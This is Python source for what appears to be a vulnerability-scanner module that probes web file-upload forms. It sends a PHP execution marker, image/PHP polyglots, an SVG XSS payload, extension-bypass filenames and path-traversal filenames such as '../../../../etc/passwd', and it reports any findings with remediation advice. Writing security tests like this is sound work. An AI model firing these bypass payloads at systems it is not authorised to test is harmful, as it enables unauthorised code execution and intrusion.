"""
Lynx VAPT - File Upload Vulnerability Scanner

Comprehensive file upload security testing:
- Unrestricted file upload detection
- MIME type bypass
- Extension bypass techniques
- SVG XSS
- Polyglot payloads
- Path traversal via filenames
- Double extension exploits
- Null byte injection
- Content-Type manipulation

Author: Lynx Team
"""

import asyncio
import re
import io
import base64
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse

from scanners.base import BaseScanner
from common import event_manager, TestingZone


@dataclass
class UploadForm:
    """Discovered file upload form."""
    url: str
    action: str
    method: str
    file_input_name: str
    other_fields: Dict[str, str] = field(default_factory=dict)


@dataclass
class UploadTestResult:
    """Result of a file upload test."""
    success: bool
    message: str
    uploaded_url: Optional[str] = None
    response_code: int = 0
    executed: bool = False


class FileUploadScanner(BaseScanner):
    """
    File Upload Vulnerability Scanner.
    
    Detects various file upload vulnerabilities:
    - Extension bypass (double extensions, null bytes)
    - MIME type bypass
    - Content-Type manipulation
    - SVG XSS injection
    - Polyglot file attacks
    - Path traversal in filenames
    - Magic byte bypass
    """
    
    # Upload form detection patterns
    FILE_INPUT_PATTERN = r'<input[^>]*type=["\']file["\'][^>]*>'
    FORM_PATTERN = r'<form[^>]*>(.*?)</form>'
    
    # Common upload endpoint paths
    UPLOAD_PATHS = [
        "/upload", "/api/upload", "/file/upload",
        "/files/upload", "/media/upload", "/image/upload",
        "/images/upload", "/documents/upload", "/attachments",
        "/api/v1/upload", "/api/files", "/api/media",
        "/admin/upload", "/panel/upload", "/cms/upload",
    ]
    
    # Dangerous file extensions to test
    DANGEROUS_EXTENSIONS = [
        ".php", ".php5", ".php7", ".phtml", ".phar",
        ".asp", ".aspx", ".ashx", ".asmx",
        ".jsp", ".jspx", ".jsf",
        ".exe", ".bat", ".cmd", ".ps1",
        ".py", ".pl", ".cgi", ".sh",
        ".htaccess", ".config", ".svg",
    ]
    
    # Extension bypass techniques
    EXTENSION_BYPASSES = [
        # Double extensions
        ("{base}.jpg.php", "Double extension"),
        ("{base}.php.jpg", "Reverse double extension"),
        ("{base}.php%00.jpg", "Null byte injection"),
        ("{base}.php%0a.jpg", "Newline injection"),
        ("{base}.php/.jpg", "Path separator"),
        
        # Case variations
        ("{base}.pHp", "Case variation"),
        ("{base}.PHP", "Uppercase extension"),
        ("{base}.pHpS", "Mixed case + trailing"),
        
        # Alternative extensions
        ("{base}.phtml", "PHP alternative - phtml"),
        ("{base}.php5", "PHP5 extension"),
        ("{base}.php7", "PHP7 extension"),
        ("{base}.phar", "PHP archive"),
        ("{base}.inc", "PHP include file"),
        
        # Content-Type tricks
        ("{base}.php.png", "PHP with PNG extension"),
        ("{base}.php;.jpg", "Semicolon separator"),
        ("{base}.php%20", "Trailing space"),
        ("{base}.php.", "Trailing dot"),
        ("{base}.php::$DATA", "Windows ADS"),
    ]
    
    # Magic bytes for file type spoofing
    MAGIC_BYTES = {
        "gif": b"GIF89a",
        "png": b"\x89PNG\r\n\x1a\n",
        "jpg": b"\xFF\xD8\xFF\xE0",
        "pdf": b"%PDF-",
        "zip": b"PK\x03\x04",
    }
    
    # XXS SVG payload
    SVG_XSS_PAYLOAD = '''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert('XSS')</script>
</svg>'''
    
    # Polyglot payloads
    POLYGLOT_PAYLOADS = {
        "gif_php": b"GIF89a<?php echo 'LYNX_RCE'; ?>",
        "png_php": b"\x89PNG\r\n\x1a\n<?php echo 'LYNX_RCE'; ?>",
        "jpg_php": b"\xFF\xD8\xFF\xE0\x00\x10JFIF<?php echo 'LYNX_RCE'; ?>",
    }
    
    # PHP webshell content (minimal, for testing)
    PHP_TEST_CONTENT = "<?php echo 'LYNX_RCE_TEST'; ?>"
    
    def __init__(self, context):
        super().__init__(context)
        self.name = "FileUploadScanner"
        self.zone = TestingZone.ZONE_A  # Input/Output Validation
        self.upload_forms: List[UploadForm] = []
    
    async def run(self):
        """Run file upload vulnerability scan."""
        await event_manager.emit("log", f"[{self.name}] Starting file upload security scan...")
        
        # Discover upload forms and endpoints
        await self._discover_upload_forms()
        await self._discover_upload_endpoints()
        
        if not self.upload_forms:
            await event_manager.emit("log", f"[{self.name}] No file upload forms found")
            return
        
        await event_manager.emit("log", 
            f"[{self.name}] Found {len(self.upload_forms)} upload form(s)")
        
        # Test each form
        for form in self.upload_forms:
            await self._test_upload_form(form)
    
    async def _discover_upload_forms(self):
        """Discover file upload forms in pages."""
        urls_to_check = list(self.context.crawled_urls)
        if not urls_to_check:
            urls_to_check = [self.context.target]
        
        from bs4 import BeautifulSoup
        
        for url in urls_to_check[:30]:  # Limit to 30 pages
            try:
                async with self.context.session.get(url, timeout=10) as response:
                    if response.status != 200:
                        continue
                    
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    # Find forms with file inputs
                    for form in soup.find_all('form'):
                        file_inputs = form.find_all('input', {'type': 'file'})
                        
                        if file_inputs:
                            action = form.get('action', url)
                            if not action.startswith('http'):
                                action = urljoin(url, action)
                            
                            method = form.get('method', 'POST').upper()
                            file_input_name = file_inputs[0].get('name', 'file')
                            
                            # Collect other form fields
                            other_fields = {}
                            for inp in form.find_all(['input', 'textarea', 'select']):
                                if inp.get('type') != 'file':
                                    name = inp.get('name')
                                    value = inp.get('value', '')
                                    if name:
                                        other_fields[name] = value
                            
                            self.upload_forms.append(UploadForm(
                                url=url,
                                action=action,
                                method=method,
                                file_input_name=file_input_name,
                                other_fields=other_fields
                            ))
                            
            except Exception:
                continue
    
    async def _discover_upload_endpoints(self):
        """Discover API upload endpoints."""
        base_url = self.context.target.rstrip('/')
        
        for path in self.UPLOAD_PATHS:
            url = urljoin(base_url, path)
            
            try:
                # Check if endpoint exists
                async with self.context.session.options(url, timeout=5) as response:
                    if response.status < 400:
                        self.upload_forms.append(UploadForm(
                            url=url,
                            action=url,
                            method="POST",
                            file_input_name="file"
                        ))
                        continue
                
                # Try HEAD request
                async with self.context.session.head(url, timeout=5) as response:
                    if response.status < 400:
                        self.upload_forms.append(UploadForm(
                            url=url,
                            action=url,
                            method="POST",
                            file_input_name="file"
                        ))
                        
            except Exception:
                continue
    
    async def _test_upload_form(self, form: UploadForm):
        """Run all tests on an upload form."""
        await self._test_unrestricted_upload(form)
        await self._test_extension_bypass(form)
        await self._test_mime_type_bypass(form)
        await self._test_svg_xss(form)
        await self._test_polyglot_upload(form)
        await self._test_path_traversal(form)
    
    async def _test_unrestricted_upload(self, form: UploadForm):
        """Test for unrestricted file upload."""
        # Try uploading a PHP file directly
        result = await self._upload_file(
            form,
            filename="test.php",
            content=self.PHP_TEST_CONTENT.encode(),
            content_type="application/x-php"
        )
        
        if result.success:
            # Check if file was executed
            if result.uploaded_url:
                executed = await self._check_execution(result.uploaded_url)
                if executed:
                    await self.emit_vulnerability(
                        "Unrestricted File Upload - RCE",
                        f"PHP file upload and execution successful.\n"
                        f"Upload URL: {form.action}\n"
                        f"Uploaded to: {result.uploaded_url}\n"
                        f"File was executed, confirming RCE.",
                        severity="P1",
                        remediation="Implement strict file type validation, store uploads outside webroot.",
                        url=form.action,
                        payload="test.php"
                    )
                    return
            
            await self.emit_vulnerability(
                "Unrestricted File Upload",
                f"Server accepts PHP file upload.\n"
                f"Upload URL: {form.action}\n"
                f"Response: {result.message[:200]}",
                severity="P1",
                remediation="Implement strict file type validation using magic bytes and whitelist.",
                url=form.action,
                payload="test.php"
            )
    
    async def _test_extension_bypass(self, form: UploadForm):
        """Test extension bypass techniques."""
        for bypass_template, technique in self.EXTENSION_BYPASSES:
            filename = bypass_template.format(base="test")
            
            result = await self._upload_file(
                form,
                filename=filename,
                content=self.PHP_TEST_CONTENT.encode(),
                content_type="image/jpeg"  # Fake MIME type
            )
            
            if result.success:
                await self.emit_vulnerability(
                    "File Upload Extension Bypass",
                    f"Server accepts file with bypass technique: {technique}\n"
                    f"Filename: {filename}\n"
                    f"Upload URL: {form.action}",
                    severity="P1",
                    remediation="Validate file extensions server-side using whitelist. Check actual file content.",
                    url=form.action,
                    payload=filename
                )
                return  # Found one bypass, stop testing
    
    async def _test_mime_type_bypass(self, form: UploadForm):
        """Test MIME type / Content-Type bypass."""
        # Upload PHP with image MIME type
        for mime_type in ["image/jpeg", "image/png", "image/gif", "text/plain"]:
            result = await self._upload_file(
                form,
                filename="test.php",
                content=self.PHP_TEST_CONTENT.encode(),
                content_type=mime_type
            )
            
            if result.success:
                await self.emit_vulnerability(
                    "File Upload MIME Type Bypass",
                    f"Server accepts PHP file with spoofed Content-Type.\n"
                    f"Content-Type used: {mime_type}\n"
                    f"Upload URL: {form.action}",
                    severity="P1",
                    remediation="Don't trust Content-Type header. Validate actual file content using magic bytes.",
                    url=form.action,
                    payload=f"Content-Type: {mime_type}"
                )
                return
    
    async def _test_svg_xss(self, form: UploadForm):
        """Test SVG XSS vulnerability."""
        result = await self._upload_file(
            form,
            filename="test.svg",
            content=self.SVG_XSS_PAYLOAD.encode(),
            content_type="image/svg+xml"
        )
        
        if result.success:
            # Check if SVG is accessible and rendered
            if result.uploaded_url:
                try:
                    async with self.context.session.get(result.uploaded_url) as response:
                        text = await response.text()
                        if "alert('XSS')" in text or self.SVG_XSS_PAYLOAD in text:
                            await self.emit_vulnerability(
                                "SVG XSS via File Upload",
                                f"SVG file with XSS payload accepted and served.\n"
                                f"Upload URL: {form.action}\n"
                                f"SVG URL: {result.uploaded_url}",
                                severity="P2",
                                remediation="Sanitize SVG files or convert to safer format. Set Content-Disposition: attachment.",
                                url=form.action,
                                payload="test.svg"
                            )
                            return
                except Exception:
                    pass
            
            await self.emit_vulnerability(
                "SVG File Upload Accepted",
                f"Server accepts SVG file uploads.\n"
                f"SVG files can contain JavaScript for XSS attacks.\n"
                f"Upload URL: {form.action}",
                severity="P3",
                remediation="Sanitize SVG files or reject them entirely.",
                url=form.action,
                payload="test.svg"
            )
    
    async def _test_polyglot_upload(self, form: UploadForm):
        """Test polyglot file bypass."""
        for polyglot_name, polyglot_content in self.POLYGLOT_PAYLOADS.items():
            ext = "jpg" if "jpg" in polyglot_name else "png" if "png" in polyglot_name else "gif"
            
            # Try with image extension
            result = await self._upload_file(
                form,
                filename=f"polyglot.{ext}",
                content=polyglot_content,
                content_type=f"image/{ext}"
            )
            
            if result.success:
                await self.emit_vulnerability(
                    "File Upload Polyglot Bypass",
                    f"Server accepts polyglot file (valid image + PHP code).\n"
                    f"Polyglot type: {polyglot_name}\n"
                    f"Upload URL: {form.action}\n"
                    f"If .htaccess allows PHP in images or file is included, RCE is possible.",
                    severity="P2",
                    remediation="Validate file content deeply. Re-encode images to strip embedded code.",
                    url=form.action,
                    payload=polyglot_name
                )
                return
    
    async def _test_path_traversal(self, form: UploadForm):
        """Test path traversal via filename."""
        traversal_filenames = [
            "../test.php",
            "..\\test.php",
            "....//test.php",
            "..%2F..%2Ftest.php",
            "..%5C..%5Ctest.php",
            "/tmp/test.php",
            "C:\\Windows\\test.php",
            "../../../../../../../etc/passwd",
        ]
        
        for filename in traversal_filenames:
            result = await self._upload_file(
                form,
                filename=filename,
                content=b"test content",
                content_type="text/plain"
            )
            
            if result.success:
                await self.emit_vulnerability(
                    "File Upload Path Traversal",
                    f"Server accepts filename with path traversal.\n"
                    f"Filename: {filename}\n"
                    f"Upload URL: {form.action}\n"
                    f"This may allow writing files to arbitrary locations.",
                    severity="P1",
                    remediation="Sanitize filenames. Generate new random filenames server-side.",
                    url=form.action,
                    payload=filename
                )
                return
    
    async def _upload_file(
        self,
        form: UploadForm,
        filename: str,
        content: bytes,
        content_type: str
    ) -> UploadTestResult:
        """Upload a file to the form."""
        import aiohttp
        
        try:
            data = aiohttp.FormData()
            
            # Add file
            data.add_field(
                form.file_input_name,
                content,
                filename=filename,
                content_type=content_type
            )
            
            # Add other form fields
            for name, value in form.other_fields.items():
                data.add_field(name, value)
            
            async with self.context.session.post(
                form.action,
                data=data,
                timeout=30
            ) as response:
                text = await response.text()
                status = response.status
                
                # Check for success indicators
                success = False
                uploaded_url = None
                
                if status == 200 or status == 201:
                    # Look for success messages
                    success_indicators = [
                        'success', 'uploaded', 'complete', 'done',
                        'file saved', 'upload successful'
                    ]
                    error_indicators = [
                        'error', 'failed', 'invalid', 'not allowed',
                        'rejected', 'forbidden', 'denied'
                    ]
                    
                    text_lower = text.lower()
                    
                    has_success = any(ind in text_lower for ind in success_indicators)
                    has_error = any(ind in text_lower for ind in error_indicators)
                    
                    if has_success and not has_error:
                        success = True
                    elif not has_error:
                        # Might be success without explicit message
                        success = True
                    
                    # Try to find uploaded file URL
                    url_patterns = [
                        r'["\'](https?://[^"\']+' + re.escape(filename.split('.')[-1]) + r')["\']',
                        r'["\'](/[^"\']+' + re.escape(filename.split('.')[-1]) + r')["\']',
                        r'url["\':\s]+["\']([^"\']+)["\']',
                        r'path["\':\s]+["\']([^"\']+)["\']',
                    ]
                    
                    for pattern in url_patterns:
                        match = re.search(pattern, text, re.I)
                        if match:
                            uploaded_url = match.group(1)
                            if not uploaded_url.startswith('http'):
                                uploaded_url = urljoin(form.action, uploaded_url)
                            break
                
                return UploadTestResult(
                    success=success,
                    message=text[:500],
                    uploaded_url=uploaded_url,
                    response_code=status
                )
                
        except Exception as e:
            return UploadTestResult(
                success=False,
                message=str(e),
                response_code=0
            )
    
    async def _check_execution(self, url: str) -> bool:
        """Check if uploaded file was executed."""
        try:
            async with self.context.session.get(url, timeout=10) as response:
                text = await response.text()
                
                # Check for our execution marker
                if "LYNX_RCE_TEST" in text:
                    return True
                    
        except Exception:
            pass
        
        return False
    
    def cleanup(self):
        """Cleanup scanner resources."""
        self.upload_forms.clear()
